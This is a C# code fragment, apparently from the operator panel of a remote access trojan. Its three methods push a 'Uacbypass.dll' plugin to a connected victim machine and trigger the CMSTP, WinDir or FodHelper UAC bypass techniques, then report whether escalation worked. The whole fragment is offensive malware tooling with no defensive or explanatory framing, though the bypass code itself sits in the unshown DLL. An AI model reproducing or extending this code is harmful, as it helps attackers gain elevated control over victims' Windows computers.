    private async Task StartCmstpUacBypass(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "Uacbypass", File.ReadAllBytes("plugins\\Uacbypass.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting Uacbypass!");
                    return;
                }
                await subClient.SendAsync(new byte[] { 1 });
                subClient.SetRecvTimeout(5000);
                byte[] data=await subClient.ReceiveAsync();
                if (data == null || data[0] !=1) 
                {
                    MessageBox.Show("The Uacbypass most likely did not succeed");
                    return;
                }
                subClient.Disconnect();
                MessageBox.Show("The Uacbypass Started successfully! (this does not mean it 100% worked)");
            }
            catch (Exception e)
            {
                MessageBox.Show("Error with Uacbypass!" + e.Message);
            }
        }

    private async Task StartWinDirBypass(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "Uacbypass", File.ReadAllBytes("plugins\\Uacbypass.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting Uacbypass!");
                    return;
                }
                await subClient.SendAsync(new byte[] { 2 });
                subClient.SetRecvTimeout(5000);
                byte[] data = await subClient.ReceiveAsync();
                if (data == null || data[0] != 1)
                {
                    MessageBox.Show("The Uacbypass most likely did not succeed");
                    return;
                }
                subClient.Disconnect();
                MessageBox.Show("The Uacbypass Started successfully! (this does not mean it 100% worked)");
            }
            catch (Exception e)
            {
                MessageBox.Show("Error with Uacbypass!" + e.Message);
            }
        }

    private async Task StartFodHelperBypass(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "Uacbypass", File.ReadAllBytes("plugins\\Uacbypass.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting Uacbypass!");
                    return;
                }
                await subClient.SendAsync(new byte[] { 3 });
                subClient.SetRecvTimeout(5000);
                byte[] data = await subClient.ReceiveAsync();
                if (data == null || data[0] != 1)
                {
                    MessageBox.Show("The Uacbypass most likely did not succeed");
                    return;
                }
                subClient.Disconnect();
                MessageBox.Show("The Uacbypass Started successfully! (this does not mean it 100% worked)");
            }
            catch (Exception e)
            {
                MessageBox.Show("Error with Uacbypass!" + e.Message);
            }
        }